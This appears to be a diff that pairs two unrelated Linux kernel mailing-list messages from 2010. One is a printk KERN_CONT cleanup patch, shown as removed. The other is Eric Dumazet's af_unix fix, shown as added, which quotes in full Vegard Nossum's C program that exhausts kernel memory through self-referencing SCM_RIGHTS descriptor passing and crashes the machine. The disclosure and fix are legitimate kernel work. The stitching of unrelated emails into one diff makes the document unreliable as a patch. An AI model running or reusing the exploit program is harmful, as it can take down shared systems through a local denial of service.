@@ -1,129 +1,188 @@
-From: =?UTF-8?q?Uwe=20Kleine-K=C3=B6nig?=
-	<u.kleine-koenig@pengutronix.de>
-Subject: [PATCH 3/6] net: add some KERN_CONT markers to continuation lines
-Date: Wed, 24 Nov 2010 09:57:47 +0100
-Message-ID: <1290589070-854-3-git-send-email-u.kleine-koenig@pengutronix.de>
-References: <20101124085645.GW4693@pengutronix.de>
+From: Eric Dumazet <eric.dumazet@gmail.com>
+Subject: [PATCH] af_unix: limit unix_tot_inflight
+Date: Wed, 24 Nov 2010 10:18:55 +0100
+Message-ID: <1290590335.3464.24.camel@edumazet-laptop>
+References: <AANLkTi=Q967xpX0KLMwX-=_4_1AKO5wjHEuJ1TrNjCj9@mail.gmail.com>
+	 <1290553918.2866.80.camel@edumazet-laptop>
 Mime-Version: 1.0
 Content-Type: text/plain; charset=UTF-8
 Content-Transfer-Encoding: QUOTED-PRINTABLE
-Cc: Russell King - ARM Linux <linux@arm.linux.org.uk>,
-	kernel@pengutronix.de, Arjan van de Ven <arjan@infradead.org>,
-	Linus Torvalds <torvalds@linux-foundation.org>,
-	netdev@vger.kernel.org
-To: linux-kernel@vger.kernel.org
-Return-path: <netdev-owner@vger.kernel.org>
-Received: from metis.ext.pengutronix.de ([92.198.50.35]:57890 "EHLO
-	metis.ext.pengutronix.de" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1752967Ab0KXI6M (ORCPT
-	<rfc822;netdev@vger.kernel.org>); Wed, 24 Nov 2010 03:58:12 -0500
-In-Reply-To: <20101124085645.GW4693@pengutronix.de>
-Sender: netdev-owner@vger.kernel.org
-List-ID: <netdev.vger.kernel.org>
+Cc: LKML <linux-kernel@vger.kernel.org>,
+	Andrew Morton <akpm@linux-foundation.org>,
+	Eugene Teo <eugene@redhat.com>, netdev <netdev@vger.kernel.org>
+To: Vegard Nossum <vegard.nossum@gmail.com>,
+	David Miller <davem@davemloft.net>
+Return-path: <linux-kernel-owner@vger.kernel.org>
+In-Reply-To: <1290553918.2866.80.camel@edumazet-laptop>
+Sender: linux-kernel-owner@vger.kernel.org
+List-Id: netdev.vger.kernel.org
 
-Cc: netdev@vger.kernel.org
-Signed-off-by: Uwe Kleine-K=C3=B6nig <u.kleine-koenig@pengutronix.de>
+Le mercredi 24 novembre 2010 =C3=A0 00:11 +0100, Eric Dumazet a =C3=A9c=
+rit :
+> Le mardi 23 novembre 2010 =C3=A0 23:21 +0100, Vegard Nossum a =C3=A9c=
+rit :
+> > Hi,
+> >=20
+> > I found this program lying around on my laptop. It kills my box
+> > (2.6.35) instantly by consuming a lot of memory (allocated by the
+> > kernel, so the process doesn't get killed by the OOM killer). As fa=
+r
+> > as I can tell, the memory isn't being freed when the program exits
+> > either. Maybe it will eventually get cleaned up the UNIX socket
+> > garbage collector thing, but in that case it doesn't get called
+> > quickly enough to save my machine at least.
+> >=20
+> > #include <sys/mount.h>
+> > #include <sys/socket.h>
+> > #include <sys/un.h>
+> > #include <sys/wait.h>
+> >=20
+> > #include <errno.h>
+> > #include <fcntl.h>
+> > #include <stdio.h>
+> > #include <stdlib.h>
+> > #include <string.h>
+> > #include <unistd.h>
+> >=20
+> > static int send_fd(int unix_fd, int fd)
+> > {
+> >         struct msghdr msgh;
+> >         struct cmsghdr *cmsg;
+> >         char buf[CMSG_SPACE(sizeof(fd))];
+> >=20
+> >         memset(&msgh, 0, sizeof(msgh));
+> >=20
+> >         memset(buf, 0, sizeof(buf));
+> >         msgh.msg_control =3D buf;
+> >         msgh.msg_controllen =3D sizeof(buf);
+> >=20
+> >         cmsg =3D CMSG_FIRSTHDR(&msgh);
+> >         cmsg->cmsg_len =3D CMSG_LEN(sizeof(fd));
+> >         cmsg->cmsg_level =3D SOL_SOCKET;
+> >         cmsg->cmsg_type =3D SCM_RIGHTS;
+> >=20
+> >         msgh.msg_controllen =3D cmsg->cmsg_len;
+> >=20
+> >         memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));
+> >         return sendmsg(unix_fd, &msgh, 0);
+> > }
+> >=20
+> > int main(int argc, char *argv[])
+> > {
+> >         while (1) {
+> >                 pid_t child;
+> >=20
+> >                 child =3D fork();
+> >                 if (child =3D=3D -1)
+> >                         exit(EXIT_FAILURE);
+> >=20
+> >                 if (child =3D=3D 0) {
+> >                         int fd[2];
+> >                         int i;
+> >=20
+> >                         if (socketpair(PF_UNIX, SOCK_SEQPACKET, 0, =
+fd) =3D=3D -1)
+> >                                 goto out_error;
+> >=20
+> >                         for (i =3D 0; i < 100; ++i) {
+> >                                 if (send_fd(fd[0], fd[0]) =3D=3D -1=
+)
+> >                                         goto out_error;
+> >=20
+> >                                 if (send_fd(fd[1], fd[1]) =3D=3D -1=
+)
+> >                                         goto out_error;
+> >                         }
+> >=20
+> >                         close(fd[0]);
+> >                         close(fd[1]);
+> >                         goto out;
+> >=20
+> >                 out_error:
+> >                         fprintf(stderr, "error: %s\n", strerror(err=
+no));
+> >                 out:
+> >                         exit(EXIT_SUCCESS);
+> >                 }
+> >=20
+> >                 while (1) {
+> >                         pid_t kid;
+> >                         int status;
+> >=20
+> >                         kid =3D wait(&status);
+> >                         if (kid =3D=3D -1) {
+> >                                 if (errno =3D=3D ECHILD)
+> >                                         break;
+> >                                 if (errno =3D=3D EINTR)
+> >                                         continue;
+> >=20
+> >                                 exit(EXIT_FAILURE);
+> >                         }
+> >=20
+> >                         if (WIFEXITED(status)) {
+> >                                 if (WEXITSTATUS(status))
+> >                                         exit(WEXITSTATUS(status));
+> >                                 break;
+> >                         }
+> >                 }
+> >         }
+> >=20
+> >         return EXIT_SUCCESS;
+> > }
+> >=20
+> >=20
+> > Vegard
+> > --
+
+Here is a patch to address this problem.
+
+Thanks
+
+[PATCH] af_unix: limit unix_tot_inflight
+
+Vegard Nossum found a unix socket OOM was possible, posting an exploit
+program.
+
+My analysis is we can eat all LOWMEM memory before unix_gc() being
+called from unix_release_sock(). Moreover, the thread blocked in
+unix_gc() can consume huge amount of time to perform cleanup because of
+huge working set.
+
+One way to handle this is to have a sensible limit on unix_tot_inflight=
+,
+tested from wait_for_unix_gc() and to force a call to unix_gc() if this
+limit is hit.
+
+This solves the OOM and also reduce overall latencies, and should not
+slowdown normal workloads.
+
+Reported-by: Vegard Nossum <vegard.nossum@gmail.com>
+Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com>
+Cc: Andrew Morton <akpm@linux-foundation.org>
+Cc: Eugene Teo <eugene@redhat.com>
 ---
- drivers/net/phy/phy.c |    4 ++--
- net/ipv4/ipconfig.c   |   32 ++++++++++++++++----------------
- 2 files changed, 18 insertions(+), 18 deletions(-)
+ net/unix/garbage.c |    7 +++++++
+ 1 files changed, 7 insertions(+)
 
-diff --git a/drivers/net/phy/phy.c b/drivers/net/phy/phy.c
-index 7670aac..a8445c7 100644
---- a/drivers/net/phy/phy.c
-+++ b/drivers/net/phy/phy.c
-@@ -47,11 +47,11 @@ void phy_print_status(struct phy_device *phydev)
- 	pr_info("PHY: %s - Link is %s", dev_name(&phydev->dev),
- 			phydev->link ? "Up" : "Down");
- 	if (phydev->link)
--		printk(" - %d/%s", phydev->speed,
-+		printk(KERN_CONT " - %d/%s", phydev->speed,
- 				DUPLEX_FULL =3D=3D phydev->duplex ?
- 				"Full" : "Half");
-=20
--	printk("\n");
-+	printk(KERN_CONT "\n");
+diff --git a/net/unix/garbage.c b/net/unix/garbage.c
+index c8df6fd..40df93d 100644
+--- a/net/unix/garbage.c
++++ b/net/unix/garbage.c
+@@ -259,9 +259,16 @@ static void inc_inflight_move_tail(struct unix_soc=
+k *u)
  }
- EXPORT_SYMBOL(phy_print_status);
 =20
-diff --git a/net/ipv4/ipconfig.c b/net/ipv4/ipconfig.c
-index 3a6e1ec..2b09775 100644
---- a/net/ipv4/ipconfig.c
-+++ b/net/ipv4/ipconfig.c
-@@ -1191,13 +1191,13 @@ static int __init ic_dynamic(void)
- 		    (ic_proto_enabled & IC_USE_DHCP) &&
- 		    ic_dhcp_msgtype !=3D DHCPACK) {
- 			ic_got_reply =3D 0;
--			printk(",");
-+			printk(KERN_CONT ",");
- 			continue;
- 		}
- #endif /* IPCONFIG_DHCP */
+ static bool gc_in_progress =3D false;
++#define UNIX_INFLIGHT_TRIGGER_GC 16000
 =20
- 		if (ic_got_reply) {
--			printk(" OK\n");
-+			printk(KERN_CONT " OK\n");
- 			break;
- 		}
-=20
-@@ -1205,7 +1205,7 @@ static int __init ic_dynamic(void)
- 			continue;
-=20
- 		if (! --retries) {
--			printk(" timed out!\n");
-+			printk(KERN_CONT " timed out!\n");
- 			break;
- 		}
-=20
-@@ -1215,7 +1215,7 @@ static int __init ic_dynamic(void)
- 		if (timeout > CONF_TIMEOUT_MAX)
- 			timeout =3D CONF_TIMEOUT_MAX;
-=20
--		printk(".");
-+		printk(KERN_CONT ".");
- 	}
-=20
- #ifdef IPCONFIG_BOOTP
-@@ -1236,7 +1236,7 @@ static int __init ic_dynamic(void)
- 		((ic_got_reply & IC_RARP) ? "RARP"
- 		 : (ic_proto_enabled & IC_USE_DHCP) ? "DHCP" : "BOOTP"),
- 		&ic_servaddr);
--	printk("my address is %pI4\n", &ic_myaddr);
-+	printk(KERN_CONT "my address is %pI4\n", &ic_myaddr);
-=20
- 	return 0;
+ void wait_for_unix_gc(void)
+ {
++	/*
++	 * If number of inflight sockets is insane,
++	 * force a garbage collect right now.
++	 */
++	if (unix_tot_inflight > UNIX_INFLIGHT_TRIGGER_GC && !gc_in_progress)
++		unix_gc();
+ 	wait_event(unix_gc_wait, gc_in_progress =3D=3D false);
  }
-@@ -1468,19 +1468,19 @@ static int __init ip_auto_config(void)
- 	/*
- 	 * Clue in the operator.
- 	 */
--	printk("IP-Config: Complete:");
--	printk("\n     device=3D%s", ic_dev->name);
--	printk(", addr=3D%pI4", &ic_myaddr);
--	printk(", mask=3D%pI4", &ic_netmask);
--	printk(", gw=3D%pI4", &ic_gateway);
--	printk(",\n     host=3D%s, domain=3D%s, nis-domain=3D%s",
-+	printk("IP-Config: Complete:\n");
-+	printk("     device=3D%s", ic_dev->name);
-+	printk(KERN_CONT ", addr=3D%pI4", &ic_myaddr);
-+	printk(KERN_CONT ", mask=3D%pI4", &ic_netmask);
-+	printk(KERN_CONT ", gw=3D%pI4", &ic_gateway);
-+	printk(KERN_CONT ",\n     host=3D%s, domain=3D%s, nis-domain=3D%s",
- 	       utsname()->nodename, ic_domain, utsname()->domainname);
--	printk(",\n     bootserver=3D%pI4", &ic_servaddr);
--	printk(", rootserver=3D%pI4", &root_server_addr);
--	printk(", rootpath=3D%s", root_server_path);
-+	printk(KERN_CONT ",\n     bootserver=3D%pI4", &ic_servaddr);
-+	printk(KERN_CONT ", rootserver=3D%pI4", &root_server_addr);
-+	printk(KERN_CONT ", rootpath=3D%s", root_server_path);
- 	if (ic_dev_mtu)
--		printk(", mtu=3D%d", ic_dev_mtu);
--	printk("\n");
-+		printk(KERN_CONT ", mtu=3D%d", ic_dev_mtu);
-+	printk(KERN_CONT "\n");
- #endif /* !SILENT */
 =20
- 	return 0;
---=20
-1.7.2.3
-
